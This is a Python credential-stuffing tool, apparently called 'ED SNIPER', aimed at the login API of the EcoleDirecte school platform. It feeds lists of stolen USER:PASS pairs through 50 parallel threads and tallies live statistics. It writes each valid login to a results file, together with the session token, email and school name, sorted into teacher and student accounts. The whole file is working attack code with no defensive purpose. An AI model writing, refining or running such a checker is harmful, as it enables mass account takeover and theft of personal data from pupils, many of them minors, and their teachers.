import requests
import json
import os
import time
import sys
from concurrent.futures import ThreadPoolExecutor

# Fonction pour afficher du texte lettre par lettre
def slow_print(text, delay=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # Nouvelle ligne après le texte

def main():
    # Affichage du texte personnalisé en bleu clair (cyan) avec effet lettre par lettre
    slow_print("\033[96m███████╗██████╗    ██████╗███╗  ██╗██╗██████╗ ███████╗██████╗ ", 0.01)
    slow_print("██╔════╝██╔══██╗  ██╔════╝████╗░██║██║██╔══██╗██╔════╝██╔══██╗", 0.01)
    slow_print("█████   ██║  ██║  ╚█████╗ ██╔██╗██║██║██████╔╝█████╗  ██████╔╝", 0.01)
    slow_print("██╔══╝  ██   ██║   ╚═══██╗██║╚████║██║██╔═══╝ ██╔══╝  ██╔══██╗", 0.01)
    slow_print("███████╗██████╔╝  ██████╔╝██║ ╚███║██║██║     ███████╗██║  ██║", 0.01)
    slow_print("╚══════╝╚═════╝   ╚═════╝ ╚═╝  ╚══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝\033[0m", 0.01)

    # Affichage de "Created by XcelianV2"
    slow_print("\033[92mCreated by XcelianV2\033[0m", 0.01)

    # Demander le fichier d'entrée
    slow_print("\033[96mEntrez le chemin du fichier contenant les identifiants (format USER:PASS) : \033[0m", 0.03)
    input_file = input().strip()

    # Vérifier si le fichier existe
    if not os.path.exists(input_file):
        slow_print("\033[91mFichier introuvable. Vérifiez le chemin.\033[0m", 0.05)
        return

    # Effacer la ligne de demande de fichier après validation
    sys.stdout.write("\033[F\033[K")  # Remonte d'une ligne et efface
    sys.stdout.write("\033[F\033[K")  # Efface la ligne du prompt utilisateur

    # Création du dossier pour les résultats
    result_dir = "results"
    os.makedirs(result_dir, exist_ok=True)
    output_file = os.path.join(result_dir, "results.txt")

    # Vider le fichier avant utilisation
    with open(output_file, "w") as outfile:
        outfile.write("")

    # Lire les identifiants du fichier avec gestion de l'encodage
    try:
        with open(input_file, "r", encoding="utf-8") as infile:
            lines = infile.readlines()
    except UnicodeDecodeError:
        slow_print("\033[91mErreur : le fichier contient des caractères non pris en charge. Essayez un autre encodage.\033[0m", 0.05)
        return

    # Variables de comptage
    global hits_prof, hits_eleve, fails, total_requests  # Déclaration des variables globales
    hits_prof = 0
    hits_eleve = 0
    fails = 0
    total_requests = 0  # Nombre total de requêtes envoyées
    start_time = time.time()  # Heure de début

    slow_print("\033[96mDémarrage du traitement...\033[0m", 0.05)

    # Affichage initial des statistiques
    print_stats(hits_prof, hits_eleve, fails, 0, first_run=True)

    # Utilisation de ThreadPoolExecutor pour gérer les requêtes simultanées
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for line in lines:
            credentials = line.strip().split(":")
            if len(credentials) != 2:
                slow_print(f"\033[91mFormat incorrect pour la ligne : {line.strip()}\033[0m", 0.05)
                continue

            user, password = credentials
            futures.append(executor.submit(handle_request, user, password, output_file, start_time))

        # Attendre la fin de toutes les requêtes
        for future in futures:
            future.result()

    # Affichage final des statistiques globales
    elapsed_time = time.time() - start_time
    minutes_elapsed = elapsed_time / 60
    cpm = total_requests / minutes_elapsed if minutes_elapsed > 0 else 0
    print_stats(hits_prof, hits_eleve, fails, cpm)

def handle_request(user, password, output_file, start_time):
    global hits_prof, hits_eleve, fails, total_requests  # Référence aux variables globales
    result = send_request(user, password)

    # Compter la requête envoyée
    total_requests += 1

    if result:
        if result.get("code") == 200:
            accounts_data = result.get('data', {}).get('accounts', [])
            if accounts_data:
                account = accounts_data[0]
                token = result.get('token', 'Non fourni')
                email = account.get('email', 'Non fourni')
                etablissement = account.get('nomEtablissement', 'Non fourni')

                # Vérification des modules pour catégorisation
                source = result.get("source", "")
                type_compte = account.get("typeCompte", "")  # Récupération du typeCompte

                if "rechercheParClasse" in source:
                    hits_prof += 1
                    category = "PROF"
                elif type_compte == "E":  # Si le typeCompte est "E", c'est un élève
                    hits_eleve += 1
                    category = "ELEVE"
                elif type_compte == "P":  # Si le typeCompte est "P", c'est un professeur
                    hits_prof += 1
                    category = "PROF"
                else:
                    category = "INCONNU"

                # Enregistrement dans le fichier de résultats
                with open(output_file, "a", encoding="utf-8") as outfile:
                    outfile.write(f"{user}:{password} [{category}] <{token}> <{email}> <{etablissement}>\n")
            else:
                fails += 1
        else:
            fails += 1
    else:
        fails += 1

    # Mise à jour des statistiques en temps réel
    elapsed_time = time.time() - start_time  # Temps écoulé en secondes
    minutes_elapsed = elapsed_time / 60  # Convertir en minutes
    cpm = total_requests / minutes_elapsed if minutes_elapsed > 0 else 0

    # Mettre à jour les statistiques à chaque itération
    print_stats(hits_prof, hits_eleve, fails, cpm)

def send_request(user, password):
    """
    Envoi une requête POST et récupère les données si le login est valide.
    """
    url = "https://api.ecoledirecte.com/v3/login.awp?v=4.62.1"
    payload = {
        "identifiant": user,
        "motdepasse": password,
        "isReLogin": False,
        "uuid": "",
        "fa": []
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "accept-language": "fr,fr-FR;q=0.9",
    }

    try:
        response = requests.post(url, data=f"data={json.dumps(payload)}", headers=headers)
        if response.status_code == 200:
            return response.json()
        else:
            return None
    except Exception as e:
        slow_print(f"\033[91mErreur lors de l'envoi de la requête : {e}\033[0m", 0.05)
        return None

def print_stats(hits_prof, hits_eleve, fails, cpm, first_run=False):
    """
    Affiche les statistiques de manière dynamique.
    """
    total_hits = hits_prof + hits_eleve
    total_accounts = total_hits + fails

    if first_run:
        print("\n" * 4)  # Réserve de l'espace pour afficher les stats
    else:
        sys.stdout.write("\033[F\033[K" * 4)  # Remonte de 4 lignes et efface

    stats = (
        f"\033[96m------CHECKER-------     -------STATS-------\033[0m\n"
        f"\033[96m[+] Hits Prof      {hits_prof}       [»] CPM (Requêtes/min) {cpm:.2f}\033[0m\n"
        f"\033[96m[+] Hits Élèves    {hits_eleve}       [»] Total Comptes  {total_accounts}\033[0m\n"
        f"\033[96m[-] Fails          {fails}         [»] Total Hits     {total_hits}\033[0m\n"
    )

    sys.stdout.write(stats)
    sys.stdout.flush()

if __name__ == "__main__":
    main()
